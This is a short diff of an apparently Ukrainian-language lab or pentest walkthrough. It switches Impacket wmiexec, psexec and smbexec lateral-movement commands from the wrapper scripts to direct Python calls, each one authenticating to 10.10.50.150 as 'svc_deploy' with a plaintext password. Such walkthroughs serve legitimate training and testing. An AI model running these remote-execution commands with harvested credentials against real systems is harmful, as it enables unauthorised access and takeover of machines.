@@ -184,14 +184,14 @@ find / -name "psexec.py" 2>/dev/null
 impacket-wmiexec svc_deploy:'Deploy@2024!Drone'@10.10.50.150
 ```
 
-Якщо помилка RPC — спробуй psexec:
+Якщо помилка RPC — запускай через Python напряму:
 ```
-impacket-psexec svc_deploy:'Deploy@2024!Drone'@10.10.50.150
+python3 /usr/share/doc/python3-impacket/examples/psexec.py svc_deploy:'Deploy@2024!Drone'@10.10.50.150
 ```
 
 Або smbexec:
 ```
-impacket-smbexec svc_deploy:'Deploy@2024!Drone'@10.10.50.150
+python3 /usr/share/doc/python3-impacket/examples/smbexec.py svc_deploy:'Deploy@2024!Drone'@10.10.50.150
 ```
 
 Знайти сервіс:
